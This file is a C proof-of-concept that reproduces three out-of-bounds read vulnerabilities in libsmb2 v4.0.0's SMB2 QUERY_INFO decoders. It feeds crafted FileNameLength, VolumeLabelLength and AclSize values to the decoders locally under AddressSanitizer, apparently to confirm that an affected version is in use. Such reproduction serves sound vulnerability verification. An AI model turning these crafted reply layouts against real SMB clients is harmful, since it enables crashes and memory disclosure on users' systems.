/* PoC: libsmb2 v4.0.0 QUERY_INFO reply decoders read past the reply buffer.
 *
 * CVE-2026-110712 (FileAllInformation), CVE-2026-110713 (FileFsVolumeInformation)
 * and CVE-2026-110714 (security-descriptor AclSize underflow). All three were
 * published against "through 6.2"; this proves v4.0.0 — the version in the S2
 * daemon — is affected too.
 *
 * Each case hands the decoder exactly the bytes the receive path would hand it
 * (the variable part of the QUERY_INFO reply) in a tight heap allocation, and
 * sets the length field the server controls. Run under ASan; argv[1] selects a
 * case (1/2/3, default all).
 *
 * Build (macOS, against a v4.0.0 checkout):
 *   git clone --depth 1 --branch v4.0.0 https://github.com/sahlberg/libsmb2.git
 *   cd libsmb2 && mkdir b && cd b
 *   cmake -DCMAKE_POLICY_VERSION_MINIMUM=3.5 -DCMAKE_DISABLE_FIND_PACKAGE_GSSAPI=ON \
 *         -DCMAKE_BUILD_TYPE=Debug -DCMAKE_C_FLAGS="-fsanitize=address -g -O1" \
 *         -DCMAKE_SHARED_LINKER_FLAGS="-fsanitize=address" .. && make -j8
 *   cd .. && /usr/bin/cc -fsanitize=address -g -O1 -I include -I include/smb2 -I lib \
 *         poc_queryinfo_oob.c -L b/lib -lsmb2 -Wl,-rpath,$PWD/b/lib -o poc
 *
 * Observed 2026-10-25 (arm64 macOS, ASan): all three abort with
 * heap-buffer-overflow READ in utf16_size (cases 1, 2) and smb2_get_uint8 from
 * decode_ace (case 3).
 */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "smb2.h"
#include "libsmb2.h"
#include "libsmb2-private.h"
void smb2_free_data(struct smb2_context *smb2, void *ptr);

static void put16(uint8_t *p, uint16_t v) { p[0] = v; p[1] = v >> 8; }
static void put32(uint8_t *p, uint32_t v)
{
        p[0] = v; p[1] = v >> 8; p[2] = v >> 16; p[3] = v >> 24;
}

/* CVE-2026-110712: FileAllInformation, FileNameLength past the buffer. */
static void case_all_info(struct smb2_context *s)
{
        size_t len = 100;
        uint8_t *r = malloc(len);
        memset(r, 0, len);
        put16(r + 96, 0x1000);          /* FileNameLength = 4096 */

        struct smb2_iovec vec = { r, len, NULL };
        struct smb2_file_all_info *fs = smb2_alloc_init(s, sizeof(*fs));
        printf("case 1: FileAllInformation, buf=%zu, FileNameLength=4096\n", len);
        smb2_decode_file_all_info(s, fs, fs, &vec);
        printf("case 1 returned (no ASan report)\n");
        smb2_free_data(s, fs);
        free(r);
}

/* CVE-2026-110713: FileFsVolumeInformation, VolumeLabelLength past the buffer. */
static void case_fs_volume(struct smb2_context *s)
{
        size_t len = 18;
        uint8_t *r = malloc(len);
        memset(r, 0, len);
        put32(r + 12, 0x1000);          /* VolumeLabelLength = 4096 */

        struct smb2_iovec vec = { r, len, NULL };
        struct smb2_file_fs_volume_info *fs = smb2_alloc_init(s, sizeof(*fs));
        printf("case 2: FileFsVolumeInformation, buf=%zu, VolumeLabelLength=4096\n", len);
        smb2_decode_file_fs_volume_info(s, fs, fs, &vec);
        printf("case 2 returned (no ASan report)\n");
        smb2_free_data(s, fs);
        free(r);
}

/* CVE-2026-110714: security descriptor with AclSize < 8 underflows the size_t. */
static void case_acl(struct smb2_context *s)
{
        size_t len = 28;
        uint8_t *r = malloc(len);
        memset(r, 0, len);
        r[0] = 1;                       /* descriptor revision */
        put32(r + 16, 20);              /* OffsetDACL */
        r[20] = 2;                      /* AclRevision */
        put16(r + 22, 0);               /* AclSize = 0  -> v.len -= 8 wraps */
        put16(r + 24, 1);               /* AceCount = 1 */

        struct smb2_iovec vec = { r, len, NULL };
        struct smb2_security_descriptor *sd = smb2_alloc_init(s, sizeof(*sd));
        printf("case 3: security descriptor, buf=%zu, AclSize=0, AceCount=1\n", len);
        smb2_decode_security_descriptor(s, sd, sd, &vec);
        printf("case 3 returned (no ASan report)\n");
        smb2_free_data(s, sd);
        free(r);
}

int main(int argc, char **argv)
{
        struct smb2_context *s = smb2_init_context();
        int c = argc > 1 ? atoi(argv[1]) : 0;
        if (s == NULL) { fprintf(stderr, "no context\n"); return 1; }
        if (c == 0 || c == 1) case_all_info(s);
        if (c == 0 || c == 2) case_fs_volume(s);
        if (c == 0 || c == 3) case_acl(s);
        smb2_destroy_context(s);
        return 0;
}
